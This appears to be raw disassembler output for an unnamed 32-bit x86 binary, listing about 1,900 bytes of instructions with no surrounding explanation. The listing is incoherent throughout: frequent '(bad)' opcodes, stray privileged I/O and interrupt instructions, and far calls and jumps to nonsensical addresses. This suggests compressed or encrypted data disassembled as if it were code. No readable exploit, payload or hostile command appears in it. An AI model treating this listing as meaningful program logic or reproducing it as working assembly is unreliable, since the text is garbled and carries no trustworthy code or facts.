  40cca8:	pushf  
  40cca9:	push   eax
  40ccaa:	push   esi
  40ccab:	cmp    bl,BYTE PTR [ebx+0x6e648a17]
  40ccb1:	call   0x7eb83863
  40ccb6:	push   esp
  40ccb7:	(bad)  
  40ccb8:	fistp  WORD PTR [edx]
  40ccba:	push   0x8e71f1e3
  40ccbf:	push   edi
  40ccc0:	push   esi
  40ccc1:	mov    ebx,0x9c781f19
  40ccc6:	ins    BYTE PTR es:[edi],dx
  40ccc7:	test   cl,bh
  40ccc9:	iret   
  40ccca:	xchg   edi,ebp
  40cccc:	ret    0xbff
  40cccf:	test   DWORD PTR [ebp+0x74],ebp
  40ccd2:	test   eax,0x98b3a21d
  40ccd7:	lods   eax,DWORD PTR ds:[esi]
  40ccd8:	pop    ss
  40ccd9:	neg    BYTE PTR [esi+0x20]
  40ccdc:	mov    edi,0x65e1672
  40cce1:	out    0x3e,al
  40cce3:	and    al,0xf6
  40cce5:	and    BYTE PTR [eax],cl
  40cce7:	mov    DWORD PTR [eax+edi*1-0x6a3f2e],edi
  40ccee:	je     0x40ccb3
  40ccf0:	mov    ebx,0x7c1173e2
  40ccf5:	push   esi
  40ccf6:	pop    ebx
  40ccf7:	pop    edx
  40ccf8:	daa    
  40ccf9:	fcmovnb st,st(7)
  40ccfb:	lea    eax,[esi-0x4deac1ec]
  40cd01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd02:	mov    ds,edx
  40cd04:	jp     0x40cd48
  40cd06:	sub    ecx,DWORD PTR [edi+ebp*4-0x2b91c5b6]
  40cd0d:	scas   al,BYTE PTR es:[edi]
  40cd0e:	in     eax,0x18
  40cd10:	adc    edi,ebx
  40cd12:	sti    
  40cd13:	cmp    DWORD PTR ds:[ebp+0x60],0x8e40da47
  40cd1b:	xlat   BYTE PTR ds:[ebx]
  40cd1c:	loop   0x40cd46
  40cd1e:	xchg   DWORD PTR [esi+0x2c],edi
  40cd21:	dec    ebp
  40cd22:	scas   eax,DWORD PTR es:[edi]
  40cd23:	push   ss
  40cd24:	xor    BYTE PTR [esi+0x6d],0x2a
  40cd28:	test   BYTE PTR [edi],0x87
  40cd2b:	push   ebp
  40cd2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd2d:	outs   dx,BYTE PTR ds:[esi]
  40cd2e:	cmc    
  40cd2f:	dec    ebx
  40cd30:	or     al,0x89
  40cd32:	lods   al,BYTE PTR ds:[esi]
  40cd33:	dec    esp
  40cd34:	mov    cl,0x7c
  40cd36:	mov    esi,0x263f3a69
  40cd3b:	push   ecx
  40cd3c:	xor    edx,ebp
  40cd3e:	or     ebx,DWORD PTR [edx]
  40cd40:	fmul   DWORD PTR [esi-0x55]
  40cd43:	push   esi
  40cd44:	outs   dx,BYTE PTR ds:[esi]
  40cd45:	in     al,0xd4
  40cd47:	mov    esp,0xd6dca475
  40cd4c:	mov    eax,0x573bc545
  40cd51:	shr    BYTE PTR [ebp-0x75779fe4],cl
  40cd57:	jp     0x40ccfb
  40cd59:	dec    ebx
  40cd5a:	loope  0x40cd21
  40cd5c:	dec    edx
  40cd5d:	lods   ax,WORD PTR ds:[esi]
  40cd5f:	sub    al,cl
  40cd61:	mov    ds:0x7329ec53,al
  40cd66:	stos   DWORD PTR es:[edi],eax
  40cd67:	sar    BYTE PTR [eax-0x65],0x4a
  40cd6b:	add    ch,BYTE PTR [ebp-0x74]
  40cd6e:	ret    0xda3a
  40cd71:	popf   
  40cd72:	push   ss
  40cd73:	test   al,0xac
  40cd75:	stos   DWORD PTR es:[edi],eax
  40cd76:	loope  0x40cd9a
  40cd78:	mov    bh,0x7d
  40cd7a:	jbe    0x40cdba
  40cd7c:	ficom  DWORD PTR ds:0x9897d0c9
  40cd82:	mov    bl,0xc1
  40cd84:	int3   
  40cd85:	xor    al,BYTE PTR [edx]
  40cd87:	mov    ecx,0x3205347f
  40cd8c:	add    eax,0x9f7eea06
  40cd91:	call   0x9286f50f
  40cd96:	mov    dh,0x26
  40cd98:	push   eax
  40cd99:	mov    DWORD PTR [edi-0x73],esp
  40cd9c:	lock clc 
  40cd9e:	pop    esi
  40cd9f:	jl     0x40cd6f
  40cda1:	xchg   BYTE PTR [edi],al
  40cda3:	enter  0x4316,0x41
  40cda7:	adc    eax,0xe1aecf38
  40cdac:	sti    
  40cdad:	mov    ebp,0x85cceaeb
  40cdb2:	jnp    0x40cd94
  40cdb4:	cli    
  40cdb5:	mov    ch,0x39
  40cdb7:	push   cs
  40cdb8:	or     eax,0x5a690cf
  40cdbd:	lea    ecx,[eax-0x2fcf124b]
  40cdc3:	cmp    cl,BYTE PTR [edx+ebx*1]
  40cdc6:	add    eax,0x64ebafc3
  40cdcb:	pop    ebp
  40cdcc:	adc    edx,DWORD PTR [edi-0x2e]
  40cdcf:	fmul   DWORD PTR ds:0x436aa42e
  40cdd5:	sbb    bl,BYTE PTR [ebx]
  40cdd7:	xchg   ebp,eax
  40cdd8:	jmp    0x40cdeb
  40cdda:	jae    0x40cd88
  40cddc:	(bad)  
  40cddd:	out    dx,eax
  40cdde:	xor    BYTE PTR [edx],ch
  40cde0:	xor    DWORD PTR [edi-0x6],esi
  40cde3:	xor    DWORD PTR [ebx],esi
  40cde5:	mov    dl,0xe3
  40cde7:	popf   
  40cde8:	popa   
  40cde9:	adc    al,0x3e
  40cdeb:	dec    ebp
  40cdec:	rcr    DWORD PTR [eax-0x2a],1
  40cdef:	(bad)  
  40cdf1:	sti    
  40cdf2:	or     eax,0xb57d9736
  40cdf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdf8:	adc    al,BYTE PTR [ecx]
  40cdfa:	sub    al,BYTE PTR [ebx+ebx*1+0x25]
  40cdfe:	ror    DWORD PTR [ebp+0xbfb2138],cl
  40ce04:	sub    dh,BYTE PTR [esi+0x70]
  40ce07:	jmp    DWORD PTR [eax-0x21]
  40ce0a:	fsub   st,st(7)
  40ce0c:	loope  0x40ce80
  40ce0e:	rcr    dl,1
  40ce10:	push   0x6629467e
  40ce15:	or     esi,DWORD PTR [esi+0x2c]
  40ce18:	xchg   BYTE PTR [ecx*1+0x4f741b7f],bl
  40ce1f:	mov    bl,0x55
  40ce21:	(bad)  
  40ce23:	cwde   
  40ce24:	mov    ch,0xef
  40ce26:	test   eax,0x58edaaf6
  40ce2b:	in     al,0xdc
  40ce2d:	stos   DWORD PTR es:[edi],eax
  40ce2e:	adc    esi,ebx
  40ce30:	adc    esi,DWORD PTR [ebp-0x63c89201]
  40ce36:	jnp    0x40cea5
  40ce38:	jo     0x40cde5
  40ce3a:	data16 shl BYTE PTR fs:[edi],0x10
  40ce3f:	ret    0xc3ef
  40ce42:	mov    BYTE PTR [esi],bh
  40ce44:	loop   0x40cea6
  40ce46:	inc    eax
  40ce47:	std    
  40ce48:	add    al,0xa9
  40ce4a:	jg     0x40ce69
  40ce4c:	ret    
  40ce4d:	dec    esp
  40ce4e:	adc    BYTE PTR ds:0xb2b9b8ae,bl
  40ce54:	adc    DWORD PTR [esi-0x44e33799],edx
  40ce5a:	jae    0x40ce7c
  40ce5c:	ins    BYTE PTR es:[edi],dx
  40ce5d:	(bad)  
  40ce5e:	xchg   ebp,eax
  40ce5f:	inc    ebp
  40ce60:	arpl   WORD PTR [edi-0x1f199a88],si
  40ce66:	ret    0xcd5b
  40ce69:	pop    ebp
  40ce6a:	add    DWORD PTR ds:0x9814df2b,edx
  40ce70:	out    dx,eax
  40ce71:	push   cs
  40ce72:	or     eax,0xf4ddf881
  40ce77:	cmp    BYTE PTR [ebx+ecx*4-0x3c],dl
  40ce7b:	out    dx,al
  40ce7c:	out    0x8a,al
  40ce7e:	hlt    
  40ce7f:	xor    BYTE PTR [edx+0x20ba286f],cl
  40ce85:	sub    eax,0xe46bbba3
  40ce8a:	ins    BYTE PTR es:[edi],dx
  40ce8b:	adc    ebx,DWORD PTR [edi]
  40ce8d:	adc    eax,0xe5e04c76
  40ce92:	and    bl,BYTE PTR [eiz*4-0x723057e1]
  40ce99:	add    BYTE PTR [eax+0x5e47339b],bl
  40ce9f:	scas   al,BYTE PTR es:[edi]
  40cea0:	rcr    edi,cl
  40cea2:	jge    0x40ce5a
  40cea4:	mov    WORD PTR [edx-0x7084c400],cs
  40ceaa:	mov    eax,0xba764c6b
  40ceaf:	add    eax,DWORD PTR [edx-0x6f]
  40ceb2:	mov    ah,0x1d
  40ceb4:	jecxz  0x40cef3
  40ceb6:	test   eax,0x2dc066e2
  40cebb:	fcmovb st,st(0)
  40cebd:	mov    al,0xf5
  40cebf:	sahf   
  40cec0:	sbb    eax,0xd05d96e5
  40cec5:	or     BYTE PTR [eax],dl
  40cec7:	mov    BYTE PTR [esi+0x11],al
  40ceca:	adc    BYTE PTR cs:[ebp-0x1835c0e],dh
  40ced1:	cmp    al,0xf7
  40ced3:	les    ebp,FWORD PTR [ebp+0x4278c3f9]
  40ced9:	bswap  esp
  40cedb:	mov    al,ds:0x14664bf3
  40cee0:	sbb    bh,BYTE PTR [ebx]
  40cee2:	pop    edx
  40cee3:	cmp    DWORD PTR [edx+0xc],ebp
  40cee6:	pop    edi
  40cee7:	je     0x40cefd
  40cee9:	sbb    ah,bl
  40ceeb:	pop    esi
  40ceec:	cld    
  40ceed:	add    cl,BYTE PTR [edi-0x21]
  40cef0:	adc    ebp,DWORD PTR [eax-0x6d]
  40cef3:	add    DWORD PTR [edi-0x58623765],ebx
  40cef9:	mov    al,ds:0x387bd198
  40cefe:	mov    ds:0xb5c327ba,eax
  40cf03:	les    esi,FWORD PTR [ebp-0x2589cf6c]
  40cf09:	pop    ss
  40cf0a:	addr16 jb 0x40cf7a
  40cf0d:	dec    esi
  40cf0e:	cld    
  40cf0f:	test   BYTE PTR [ebx+0x43],0xe6
  40cf13:	jae    0x40ceb7
  40cf15:	jp     0x40cf73
  40cf17:	adc    dl,BYTE PTR [edi]
  40cf19:	and    eax,0x4218bf99
  40cf1e:	add    esp,esp
  40cf20:	aad    0xff
  40cf22:	mov    eax,ds:0x7f2c7149
  40cf27:	sub    bh,BYTE PTR [edx-0x48891853]
  40cf2d:	fcom   QWORD PTR ds:0x2e9564f3
  40cf33:	dec    edx
  40cf35:	mov    bl,0xa1
  40cf37:	mov    ah,0x70
  40cf39:	out    0xdc,eax
  40cf3b:	pop    eax
  40cf3c:	scas   al,BYTE PTR es:[edi]
  40cf3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf3e:	sub    BYTE PTR [edx],dh
  40cf40:	(bad)  
  40cf41:	mov    ebp,0xc722a895
  40cf46:	in     eax,0x5a
  40cf48:	mov    ds:0x5e211a1a,al
  40cf4d:	add    al,0x5d
  40cf4f:	push   ds
  40cf50:	mov    al,ds:0x401bb8e0
  40cf55:	test   edi,esi
  40cf57:	rol    DWORD PTR [edx+esi*4-0x3eec2860],cl
  40cf5e:	rol    al,cl
  40cf60:	(bad)  
  40cf61:	lds    edx,FWORD PTR es:[edx+0x566caf6d]
  40cf68:	mov    ah,0x90
  40cf6a:	aad    0x49
  40cf6c:	imul   ecx,edx,0x2f
  40cf6f:	sbb    ch,0xd7
  40cf72:	pop    edi
  40cf73:	imul   ebp,DWORD PTR [edi+0x12],0xffffffb1
  40cf77:	nop
  40cf78:	les    eax,FWORD PTR [esi+0x4d647ee4]
  40cf7e:	jg     0x40cf72
  40cf80:	sub    DWORD PTR [ecx],ebx
  40cf82:	mov    ds:0x4db81130,al
  40cf87:	pop    edx
  40cf88:	aas    
  40cf89:	das    
  40cf8a:	lds    edi,FWORD PTR [ecx]
  40cf8c:	inc    ebp
  40cf8d:	icebp  
  40cf8e:	push   edi
  40cf8f:	outs   dx,DWORD PTR ds:[esi]
  40cf90:	ret    
  40cf91:	cmp    al,0x68
  40cf93:	mov    ds:0x532f96ac,eax
  40cf98:	inc    edi
  40cf99:	dec    edi
  40cf9a:	jle    0x40d00c
  40cf9c:	mov    ebp,0x60328802
  40cfa1:	and    BYTE PTR [ebp+eax*2+0x57],dl
  40cfa5:	out    0x2f,al
  40cfa7:	test   BYTE PTR [edi],dl
  40cfa9:	shl    BYTE PTR [ecx+0x4b5db42b],cl
  40cfaf:	xchg   ecx,eax
  40cfb0:	stos   BYTE PTR es:[edi],al
  40cfb1:	imul   ebx,DWORD PTR [ebp+0x5d910b41],0xa1b5f4b4
  40cfbb:	ret    
  40cfbc:	jns    0x40cff7
  40cfbe:	lods   al,BYTE PTR ds:[esi]
  40cfbf:	addr16 jnp 0x40cf76
  40cfc2:	xchg   edi,eax
  40cfc3:	inc    ebp
  40cfc4:	(bad)  
  40cfc5:	sti    
  40cfc6:	dec    esp
  40cfc7:	lods   al,BYTE PTR ds:[esi]
  40cfc8:	inc    esi
  40cfc9:	loopne 0x40cf94
  40cfcb:	push   eax
  40cfcc:	mov    esp,ebp
  40cfce:	fisubr DWORD PTR [edx-0x58]
  40cfd1:	loop   0x40d00b
  40cfd3:	or     DWORD PTR [edi-0x7442a9c1],eax
  40cfd9:	jle    0x40cfc6
  40cfdb:	or     DWORD PTR [edx+0x74481390],0x2c9efc1b
  40cfe5:	adc    bh,BYTE PTR [eax]
  40cfe7:	and    dh,BYTE PTR [esi-0x75]
  40cfea:	or     al,0x83
  40cfec:	(bad)  
  40cfed:	xlat   BYTE PTR ds:[ebx]
  40cfee:	loop   0x40d010
  40cff0:	jmp    ebx
  40cff2:	xchg   esi,eax
  40cff3:	push   ss
  40cff4:	dec    ebx
  40cff5:	shl    BYTE PTR [edx+0x3f],0x40
  40cff9:	mov    eax,DWORD PTR [ecx-0x1a]
  40cffc:	fs scas al,BYTE PTR es:[edi]
  40cffe:	into   
  40cfff:	arpl   sp,dx
  40d001:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d002:	inc    eax
  40d003:	int    0x7c
  40d005:	(bad)  
  40d006:	adc    bh,BYTE PTR [ebx]
  40d008:	jns    0x40d088
  40d00a:	sbb    ebp,DWORD PTR [ebp+0x73596c06]
  40d010:	cwde   
  40d011:	or     eax,0xddb409e7
  40d016:	inc    ebp
  40d017:	and    DWORD PTR [ebp-0x49c0d1d2],ecx
  40d01d:	ins    DWORD PTR es:[edi],dx
  40d01e:	ss in  al,0xc4
  40d021:	push   esi
  40d022:	adc    DWORD PTR [esi+0x21],edi
  40d025:	xor    eax,0xb487a537
  40d02a:	pop    ss
  40d02b:	pop    ebx
  40d02c:	retf   0x8ef
  40d02f:	mov    eax,0xa6af8bf2
  40d034:	sbb    ecx,DWORD PTR ds:0xcb3a8d23
  40d03a:	(bad)  
  40d03b:	popf   
  40d03c:	les    esi,FWORD PTR [ebx-0x67bd49f7]
  40d042:	stc    
  40d043:	jmp    0xff50:0xea2b2c1b
  40d04a:	inc    edx
  40d04b:	inc    ebx
  40d04c:	mov    ah,0xfa
  40d04e:	jb     0x40d06b
  40d050:	sbb    al,0x99
  40d052:	sub    BYTE PTR [ecx-0x743410f],ch
  40d058:	jg     0x40d02c
  40d05a:	imul   edx,DWORD PTR [edx-0x51],0x68
  40d05e:	inc    ebp
  40d05f:	jl     0x40d05b
  40d061:	and    bl,BYTE PTR fs:[ebp+0x3f1fcb00]
  40d068:	adc    bl,0xa9
  40d06b:	sub    DWORD PTR [eax],ecx
  40d06d:	test   al,0x88
  40d06f:	or     eax,DWORD PTR [ecx+0x5b]
  40d072:	outs   dx,BYTE PTR ds:[esi]
  40d073:	adc    eax,0xc1255f79
  40d078:	add    eax,ebp
  40d07a:	js     0x40d01f
  40d07c:	adc    esp,DWORD PTR [ebp-0x30]
  40d07f:	sbb    BYTE PTR [edi],bh
  40d081:	cmp    BYTE PTR [esi-0x4a],bl
  40d084:	sahf   
  40d085:	mov    bh,0x3b
  40d087:	lahf   
  40d088:	dec    eax
  40d089:	(bad)  
  40d08a:	and    bl,BYTE PTR [eax]
  40d08c:	sti    
  40d08d:	push   ebx
  40d08e:	stos   BYTE PTR es:[edi],al
  40d08f:	jno    0x40d039
  40d091:	call   0x270f:0xaf0b2faf
  40d098:	adc    DWORD PTR [ecx-0x37],ecx
  40d09b:	in     eax,dx
  40d09c:	pop    ebx
  40d09d:	add    cl,ah
  40d09f:	div    DWORD PTR [ebx]
  40d0a1:	loop   0x40d03d
  40d0a3:	mov    cl,0x6a
  40d0a5:	xor    ah,BYTE PTR [esp+esi*2-0x45]
  40d0a9:	js     0x40d091
  40d0ab:	adc    BYTE PTR [eax-0x53],dl
  40d0ae:	dec    esp
  40d0af:	mov    ds:0xa95c1516,al
  40d0b4:	push   ecx
  40d0b5:	shl    BYTE PTR [esi],cl
  40d0b7:	scas   eax,DWORD PTR es:[edi]
  40d0b8:	sbb    BYTE PTR [ebp+0x4b],0xea
  40d0bc:	pusha  
  40d0bd:	jb     0x40d06a
  40d0bf:	call   0x5a27:0xfb0ce083
  40d0c6:	popf   
  40d0c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0c8:	mov    ds:0x12d5e59f,eax
  40d0cd:	arpl   WORD PTR [esi-0x2aa61e5f],dx
  40d0d3:	push   esi
  40d0d4:	mov    bh,BYTE PTR [eax-0x5a56dd11]
  40d0da:	ror    DWORD PTR [edi-0x33],cl
  40d0dd:	push   0x13
  40d0df:	mov    al,0x46
  40d0e1:	ins    DWORD PTR es:[edi],dx
  40d0e2:	movq   mm1,mm7
  40d0e5:	xchg   ebp,eax
  40d0e6:	imul   ecx,DWORD PTR [ecx],0x6b2a0d9e
  40d0ec:	dec    edx
  40d0ed:	mov    cs,WORD PTR [ebx+0x29]
  40d0f0:	jo     0x40d073
  40d0f2:	dec    ch
  40d0f4:	int3   
  40d0f5:	(bad)  
  40d0f6:	sub    al,0x67
  40d0f8:	int3   
  40d0f9:	and    DWORD PTR [esi+ebx*4-0x68],edx
  40d0fd:	or     BYTE PTR [ebx+0x3e7483f9],bh
  40d103:	pop    ecx
  40d104:	cs pop esp
  40d106:	in     eax,dx
  40d107:	push   ebp
  40d108:	jmp    0xc85473b4
  40d10d:	scas   eax,DWORD PTR es:[edi]
  40d10e:	in     eax,dx
  40d10f:	push   cs
  40d110:	addr16 jbe 0x40d12d
  40d113:	in     eax,dx
  40d114:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d115:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d116:	pop    eax
  40d117:	sub    DWORD PTR ds:0xc616d499,esp
  40d11d:	data16 arpl bx,bx
  40d120:	mov    edi,0x47310c25
  40d125:	add    edx,DWORD PTR [ecx-0x6e]
  40d128:	stos   BYTE PTR es:[edi],al
  40d129:	adc    bh,dh
  40d12b:	or     BYTE PTR [ebp-0x16fa61f],dh
  40d131:	fstp   st(4)
  40d133:	inc    esp
  40d134:	cmc    
  40d135:	jl     0x40d0e1
  40d137:	retf   
  40d138:	test   ebx,ebp
  40d13a:	push   ss
  40d13b:	sub    ah,ch
  40d13d:	cs push ebp
  40d13f:	mov    ch,BYTE PTR [esi-0x70]
  40d142:	rol    DWORD PTR [eax+0x73cac90d],cl
  40d148:	div    DWORD PTR [ebx]
  40d14a:	push   ss
  40d14b:	push   ecx
  40d14c:	mov    bh,0x46
  40d14e:	aam    0xd3
  40d150:	inc    esp
  40d151:	push   ebx
  40d152:	nop
  40d153:	jmp    0x51424394
  40d158:	push   es
  40d159:	and    bl,0xa7
  40d15c:	inc    edx
  40d15d:	fiadd  WORD PTR [esi]
  40d15f:	(bad)  
  40d160:	ins    BYTE PTR es:[edi],dx
  40d161:	dec    esp
  40d162:	xchg   bl,bh
  40d164:	pop    ebx
  40d165:	daa    
  40d166:	cld    
  40d167:	js     0x40d0fb
  40d169:	jle    0x40d195
  40d16b:	call   0x178c6291
  40d170:	xchg   ebp,eax
  40d171:	adc    ah,BYTE PTR [esi-0x72e305cc]
  40d177:	inc    esi
  40d178:	inc    edx
  40d179:	sbb    BYTE PTR [ebx],dh
  40d17b:	dec    edx
  40d17c:	push   es
  40d17d:	xor    edi,DWORD PTR [eax-0x4d]
  40d180:	jno    0x40d165
  40d182:	mov    ebp,0x14c9fbf0
  40d187:	mov    ebx,0xbaca2081
  40d18c:	les    edi,FWORD PTR [ebp+0x2decf354]
  40d192:	xor    eax,0x7da114a4
  40d197:	dec    edx
  40d198:	mov    ebx,0x1ce11812
  40d19d:	dec    ecx
  40d19e:	in     eax,0x8
  40d1a0:	or     ebx,ebp
  40d1a2:	shr    DWORD PTR [ebp+0x61e724d0],cl
  40d1a8:	cdq    
  40d1a9:	test   eax,0x297957d2
  40d1ae:	sbb    edx,ebx
  40d1b0:	pop    esi
  40d1b1:	sub    eax,0x17ae1209
  40d1b6:	jo     0x40d18a
  40d1b8:	ins    BYTE PTR es:[edi],dx
  40d1b9:	pause  
  40d1bb:	mov    edx,0x23f36f99
  40d1c0:	mov    cl,0x6e
  40d1c2:	mov    esi,0x2fbf15ce
  40d1c7:	inc    ebp
  40d1c8:	and    ecx,ebp
  40d1ca:	pushf  
  40d1cb:	mov    edi,0xebcd08a
  40d1d0:	aas    
  40d1d1:	sub    BYTE PTR [edi+0x72613705],ch
  40d1d7:	jmp    0xd871:0x2655109d
  40d1de:	out    dx,eax
  40d1df:	sbb    esp,esp
  40d1e1:	adc    BYTE PTR [esi+esi*1-0x39b1eb16],bh
  40d1e8:	fild   DWORD PTR [esi+ecx*4-0x42]
  40d1ec:	jb     0x40d25a
  40d1ee:	addr16 inc esp
  40d1f0:	push   cs
  40d1f1:	push   eax
  40d1f2:	sub    bh,BYTE PTR [edx+ebx*1]
  40d1f5:	pop    es
  40d1f6:	mov    ds:0xa82fc8e4,al
  40d1fb:	ins    DWORD PTR es:[edi],dx
  40d1fc:	ffree  st(7)
  40d1fe:	cmp    BYTE PTR [edx+0x5cc43899],0x1e
  40d205:	xchg   ebx,eax
  40d206:	xchg   BYTE PTR [eax+0x6a],al
  40d209:	dec    ebx
  40d20a:	mov    ebp,0x1746cd37
  40d20f:	and    edi,edx
  40d211:	(bad)  
  40d212:	jmp    0x33118a8a
  40d217:	(bad)
  40d21a:	sbb    BYTE PTR [esi+0x2e68f1eb],0xd6
  40d221:	out    dx,al
  40d222:	dec    ecx
  40d223:	into   
  40d224:	dec    edx
  40d225:	aaa    
  40d226:	call   0xf510:0xcab482c3
  40d22d:	push   ebp
  40d22e:	in     eax,0xc9
  40d230:	push   eax
  40d231:	lea    ebp,[edi-0x40aabc1c]
  40d237:	xchg   ebx,eax
  40d238:	or     ah,bh
  40d23a:	test   BYTE PTR [ecx+esi*4],0xa2
  40d23e:	popa   
  40d23f:	stos   BYTE PTR es:[edi],al
  40d240:	cmp    ebx,ebx
  40d242:	in     eax,dx
  40d243:	add    eax,0xf9580516
  40d248:	and    edi,DWORD PTR [eax+eiz*2+0x7461932a]
  40d24f:	data16 mov bh,0x89
  40d252:	add    al,0x9d
  40d254:	int    0x12
  40d256:	iret   
  40d257:	jg     0x40d2bc
  40d259:	clc    
  40d25a:	in     al,dx
  40d25b:	imul   esi,edx,0xeee62e00
  40d261:	aam    0xcb
  40d263:	jno    0x40d22c
  40d265:	dec    ax
  40d267:	inc    ebp
  40d268:	mov    dh,BYTE PTR [edi]
  40d26a:	test   al,0xff
  40d26c:	adc    eax,0xfd2af4b2
  40d271:	xor    DWORD PTR [eax-0x1a],esp
  40d274:	ficomp DWORD PTR [eax-0x5d]
  40d277:	fmul   DWORD PTR [edi+0x50dcb417]
  40d27d:	mov    ah,0x59
  40d27f:	call   0x7a0450c2
  40d284:	stos   DWORD PTR es:[edi],eax
  40d285:	ss pop es
  40d287:	add    esi,DWORD PTR [esi]
  40d289:	xor    al,0x65
  40d28b:	aad    0x37
  40d28d:	sbb    al,0xef
  40d28f:	cmp    BYTE PTR ds:0xe2ecd358,bl
  40d295:	jae    0x40d30e
  40d297:	lea    edx,[ebx+eiz*1]
  40d29a:	push   ecx
  40d29b:	lock mov esi,0xe898291d
  40d2a1:	fisubr DWORD PTR [edi+edi*8]
  40d2a4:	cmp    ah,BYTE PTR ds:0xbc1aa2c0
  40d2aa:	(bad)  
  40d2ac:	xchg   ebx,eax
  40d2ad:	sub    al,0x71
  40d2af:	or     eax,DWORD PTR [edx+0x3c]
  40d2b2:	in     al,0x3a
  40d2b4:	sbb    DWORD PTR [edi],edi
  40d2b6:	icebp  
  40d2b7:	inc    esp
  40d2b8:	retf   0xd09f
  40d2bb:	add    cl,dh
  40d2bd:	rcr    DWORD PTR [ebx+0xee470e1],cl
  40d2c3:	sub    al,0x63
  40d2c5:	aaa    
  40d2c6:	clc    
  40d2c7:	fadd   DWORD PTR [edi-0x1d2e1a31]
  40d2cd:	sahf   
  40d2ce:	pop    es
  40d2cf:	cli    
  40d2d0:	jge    0x40d2cc
  40d2d2:	pop    ebx
  40d2d3:	inc    ecx
  40d2d4:	imul   ebx,DWORD PTR [eax],0xc5577cb6
  40d2da:	jl     0x40d304
  40d2dc:	sub    eax,0x8b0a3e12
  40d2e1:	cmovae eax,edx
  40d2e4:	inc    BYTE PTR [ebp+ecx*4-0x17]
  40d2e8:	int    0x89
  40d2ea:	push   es
  40d2eb:	or     BYTE PTR [edx+esi*1],bl
  40d2ee:	fidiv  DWORD PTR [eax-0x12]
  40d2f1:	iret   
  40d2f2:	scas   al,BYTE PTR es:[edi]
  40d2f3:	add    dh,dh
  40d2f5:	ficom  DWORD PTR [ebx]
  40d2f7:	adc    edx,esi
  40d2f9:	pop    eax
  40d2fa:	bound  ebp,QWORD PTR ds:0xbaef7ba3
  40d300:	cmp    eax,0xa7e31fb0
  40d305:	hlt    
  40d306:	ret    
  40d307:	and    al,BYTE PTR [eax]
  40d309:	inc    ebx
  40d30a:	add    BYTE PTR [edi+0x5a5e5d2a],bl
  40d310:	in     al,0xb6
  40d312:	adc    dl,bh
  40d314:	fisub  DWORD PTR [esi+0x4f433c21]
  40d31a:	pop    es
  40d31b:	adc    bl,ah
  40d31d:	jbe    0x40d37c
  40d31f:	lea    edx,[ebp+0x461b0af2]
  40d325:	xchg   esp,eax
  40d326:	addr16 sahf 
  40d328:	sbb    al,0x1c
  40d32a:	mov    ebp,0x6a5ec71d
  40d32f:	pushf  
  40d330:	fsub   QWORD PTR [esi-0x75851fa6]
  40d336:	and    BYTE PTR [eax],cl
  40d338:	or     eax,0x98950a01
  40d33d:	dec    ebp
  40d33e:	icebp  
  40d33f:	xchg   ecx,edx
  40d341:	sar    DWORD PTR [ebp-0x43d74722],1
  40d347:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d348:	gs mov ah,0x95
  40d34b:	clc    
  40d34c:	pop    ebx
  40d34d:	fnsave [edi+0x45]
  40d350:	dec    edx
  40d351:	add    eax,0x14c44a87
  40d356:	dec    edx
  40d357:	xchg   ecx,eax
  40d358:	aad    0x22
  40d35a:	add    BYTE PTR [edi+0x6b],0x8f
  40d35e:	scas   eax,DWORD PTR es:[edi]
  40d35f:	test   al,0xe8
  40d361:	scas   eax,DWORD PTR es:[edi]
  40d362:	pusha  
  40d363:	cmp    eax,0xa18a9db5
  40d368:	out    0x15,eax
  40d36a:	adc    DWORD PTR [edi+eiz*1-0x56],ebx
  40d36e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d36f:	cmp    DWORD PTR [edx+edi*1],edi
  40d372:	data16 daa 
  40d374:	fistp  WORD PTR [edi+edx*8]
  40d377:	add    DWORD PTR [esi+0x4e6d0dc2],edi
  40d37d:	xchg   edi,eax
  40d37e:	inc    BYTE PTR [edi+0x655fa934]
  40d384:	sahf   
  40d385:	mov    edx,0xfb88d445
  40d38a:	xchg   edx,eax
  40d38b:	xor    ebp,ebx
  40d38d:	enter  0xf0d1,0x87
  40d391:	sahf   
  40d392:	ins    DWORD PTR es:[edi],dx
  40d393:	xchg   BYTE PTR [ebx-0x4a],bl
  40d396:	mov    ds:0x7c206c72,al
  40d39b:	cmc    
  40d39c:	test   eax,0xc3dc5a20
  40d3a1:	arpl   WORD PTR [esi-0x32],dx
  40d3a4:	push   0xffffffa6
  40d3a6:	scas   al,BYTE PTR es:[edi]
  40d3a7:	jmp    0x40d392
  40d3a9:	lods   eax,DWORD PTR ds:[esi]
  40d3aa:	cmp    eax,0xd1fdc1a7
  40d3af:	aam    0xae
  40d3b1:	out    0xd6,al
  40d3b3:	mov    ebp,0x43bd876d
  40d3b8:	cmc    
  40d3b9:	nop
  40d3ba:	into   
  40d3bb:	sub    al,0x8b
  40d3bd:	sbb    al,0xed
  40d3bf:	mov    BYTE PTR [edi],dh
  40d3c1:	repnz push 0xbfebd900
  40d3c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3c8:	(bad)  
  40d3c9:	in     al,0xf4
  40d3cb:	mov    al,0x27
  40d3cd:	xor    eax,0x5c56badb
  40d3d2:	call   0xfe43:0xe878a36f
  40d3d9:	inc    ecx
  40d3da:	pushf  
  40d3db:	fdiv   st,st(5)
  40d3dd:	rcr    BYTE PTR [ebp-0x341a352e],1
  40d3e3:	mov    WORD PTR [edx+0x2d821cb4],gs
  40d3e9:	or     eax,0x55ec67ca
  40d3ee:	pop    esi
  40d3ef:	(bad)
  40d3f2:	mov    dl,0xd5
  40d3f4:	mov    edi,0x79d8d27d
  40d3f9:	add    BYTE PTR [edx-0x23],0x74
  40d3fd:	adc    eax,0xe76a549a
  40d402:	push   cs
  40d403:	test   eax,0xe997d66b
  40d408:	mov    al,0x70
  40d40a:	sub    ebp,DWORD PTR [edx-0x8]
  40d40d:	jp     0x40d451
  40d40f:	xchg   ecx,eax
  40d410:	fdivp  st(7),st
  40d412:	mov    al,ds:0x9adef4c2
  40d417:	aas    
  40d418:	jae    0x40d47c
  40d41a:	dec    ebp
  40d41b:	dec    esp
  40d41c:	loopne 0x40d40a
